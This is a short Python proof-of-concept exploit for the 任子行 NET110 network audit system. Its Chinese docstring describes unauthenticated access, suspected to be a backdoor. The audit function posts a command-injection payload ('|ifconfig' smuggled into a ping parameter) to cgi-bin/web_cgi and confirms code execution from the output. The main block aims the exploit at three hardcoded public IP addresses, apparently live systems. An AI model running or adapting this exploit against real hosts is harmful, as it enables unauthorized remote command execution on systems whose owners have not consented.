#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  任子行net110网络审计系统无需登录任意命令执行（疑似后门）
Author    :  a
mail      :  a@lcx.cc

一般系统登录会判断Cookie值，而Cookie一般会随登录随机变化或随密码固定不变。如果Cookie不正确会提示登录等等未授权信息或提示重新登录信息，但是“任子行”NET 110网络安全审计系统很奇怪，居然把Cookie整个值删除后再访问就能获取相关信息
 """
import urlparse
import time

def assign(service, arg):
    if service == 'net110':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    
    url = arg + "cgi-bin/web_cgi"
    data = 'ip_addr=www.baidu.com |ifconfig&module=net_tool&op_req=read_system&sub_module=ping'
    code, head, res, errcode, _ = curl.curl2(url,data)
    if code==200 and 'Ethernet  HWaddr' in res and 'Bcast' in res:
        security_hole(arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('net110', 'http://222.160.174.50/')[1])
    audit(assign('net110', 'http://218.29.237.74/')[1])
    audit(assign('net110', 'http://219.150.20.69/')[1])